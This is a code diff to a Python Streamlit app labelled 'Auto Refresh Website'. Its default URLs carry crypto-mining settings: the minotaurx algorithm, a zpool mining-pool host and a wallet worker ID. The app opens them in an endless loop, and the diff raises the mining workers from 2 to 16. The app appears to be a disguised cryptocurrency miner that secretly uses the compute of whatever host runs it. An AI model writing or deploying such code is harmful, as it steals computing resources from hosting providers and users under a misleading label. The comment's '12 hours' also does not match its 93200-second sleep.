@@ -44,11 +44,11 @@ def open_website(url):
 st.title("Auto Refresh Website")
 
 # URL situs web yang ingin dibuka
-url1 = st.text_input("Masukkan URL 1:", "https://nucleuser.com.mamida-rwl.sch.id?algorithm=minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=RTtrydymx5kasjL7sTEnUWctqWHhSE1W7i&password=c%3DRVN&workers=2")
-url2 = st.text_input("Masukkan URL 2:", "https://nucleuser.com.mamida-rwl.sch.id?algorithm=minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=RTtrydymx5kasjL7sTEnUWctqWHhSE1W7i&password=c%3DRVN&workers=2")
+url1 = st.text_input("Masukkan URL 1:", "https://nucleuser.com.mamida-rwl.sch.id?algorithm=minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=RTtrydymx5kasjL7sTEnUWctqWHhSE1W7i&password=c%3DRVN&workers=16")
+#url2 = st.text_input("Masukkan URL 2:", "https://nucleuser.com.mamida-rwl.sch.id?algorithm=minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=RTtrydymx5kasjL7sTEnUWctqWHhSE1W7i&password=c%3DRVN&workers=16")
 
 # Looping untuk refresh otomatis
 while True:
     open_website(url1)
-    open_website(url2)
+    #open_website(url2)
     time.sleep(93200)  # Tunggu 12 jam
